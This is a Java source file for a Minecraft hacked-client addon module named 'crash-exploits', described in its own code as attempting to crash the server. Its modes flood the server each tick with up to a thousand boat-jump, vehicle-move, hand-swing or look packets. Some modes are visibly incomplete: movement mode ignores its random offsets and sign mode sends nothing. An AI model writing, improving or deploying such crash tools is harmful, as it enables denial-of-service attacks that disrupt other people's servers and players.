package dev.saturn.addon.modules.Misc;

import java.util.Objects;
import java.util.Random;

import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.orbit.EventHandler;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.PlaySoundEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.DoubleSetting;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

public class CrashExploits extends Module {
    private final SettingGroup sgGeneral;

    private final Setting<Mode> crashMode;
    private final Setting<Double> speed;
    private final Setting<Integer> packetAmount;
    private final Setting<Boolean> autoDisable;
    private final Setting<Boolean> blockSounds;

    public CrashExploits() {
        super(Categories.Misc, "crash-exploits", "Attempts to crash the server. | Ported from BedTrap");

        sgGeneral = settings.getDefaultGroup();

        crashMode = sgGeneral.add(new EnumSetting.Builder<Mode>()
                .name("mode")
                .description("Crash method to use.")
                .defaultValue(Mode.BOAT)
                .build()
        );

        speed = sgGeneral.add(new DoubleSetting.Builder()
                .name("speed")
                .description("Movement speed in blocks per second (Entity mode only).")
                .defaultValue(1.0)
                .min(0.1)
                .sliderMax(100.0)
                .build()
        );

        packetAmount = sgGeneral.add(new IntSetting.Builder()
                .name("packets")
                .description("Number of packets to send per tick.")
                .defaultValue(100)
                .min(1)
                .sliderMax(1000)
                .build()
        );

        autoDisable = sgGeneral.add(new BoolSetting.Builder()
                .name("auto-disable")
                .description("Automatically disables the module on kick.")
                .defaultValue(false)
                .build()
        );

        blockSounds = sgGeneral.add(new BoolSetting.Builder()
                .name("block-sounds")
                .description("Blocks paddle sounds (Boat mode only).")
                .defaultValue(false)
                .build()
        );
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent event) {
        if (crashMode.get() == Mode.BOAT && blockSounds.get() && event.sound.getId().toString().contains("boat")) {
            event.cancel();
        }
    }

    @Override
    public void onActivate() {
        if (crashMode.get() == Mode.ENTITY) {
            ClientPlayerEntity player = mc.player;
            if (player == null || player.getVehicle() == null) {
                ChatUtils.info("You must be riding an entity - disabling.");
                toggle();
            }
        }
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        ClientPlayerEntity player = mc.player;
        if (player == null) return;

        switch (crashMode.get()) {
            case BOAT -> handleBoatMode(player);
            case ENTITY -> handleEntityMode(player);
            case MOVEMENT -> handleMovementMode(player);
            case PACKET_SPAM -> handlePacketSpamMode();
            case SIGN -> handleSignMode(player);
            case UNNAMED -> handleUnnamedCrashMode(player);
        }
    }

    private void handleBoatMode(ClientPlayerEntity player) {
        if (!(player.getVehicle() instanceof BoatEntity)) {
            ChatUtils.info("You must be in a boat - disabling.");
            toggle();
            return;
        }

        for (int i = 0; i < packetAmount.get(); i++) {
            mc.getNetworkHandler().sendPacket(new ClientCommandC2SPacket(player.getVehicle(), ClientCommandC2SPacket.Mode.START_RIDING_JUMP));
        }
    }

    private void handleEntityMode(ClientPlayerEntity player) {
        Entity vehicle = player.getVehicle();
        if (vehicle == null) return;

        Vec3d pos = vehicle.getPos();
        for (int i = 0; i < packetAmount.get(); i++) {
            vehicle.updatePosition(pos.x, pos.y + speed.get(), pos.z);
            mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.Full(pos.x, pos.y, pos.z, player.getYaw(), player.getPitch(), true, true));
        }
    }

    private void handleMovementMode(ClientPlayerEntity player) {
        Vec3d pos = player.getPos();

        for (int i = 0; i < packetAmount.get(); i++) {
            double xOffset = getRandomOffset();
            double yOffset = getRandomOffset();
            double zOffset = getRandomOffset();

            mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.Full(
                    pos.x, pos.y, pos.z, player.getYaw(), player.getPitch(), true, true));
        }
    }

    private void handlePacketSpamMode() {
        for (int i = 0; i < packetAmount.get(); i++) {
            mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        }
    }

    private void handleSignMode(ClientPlayerEntity player) {
        for (int i = 0; i < packetAmount.get(); i++) {
            BlockPos pos = player.getBlockPos();
        }
    }

    private void handleUnnamedCrashMode(ClientPlayerEntity player) {
        for (int i = 0; i < packetAmount.get(); i++) {
            mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(player.getYaw(), player.getPitch(), true, true));
        }
    }

    private double getRandomOffset() {
        return new Random().nextDouble() - 0.5;
    }

    public enum Mode {
        BOAT,
        ENTITY,
        MOVEMENT,
        PACKET_SPAM,
        SIGN,
        UNNAMED;
    }
}
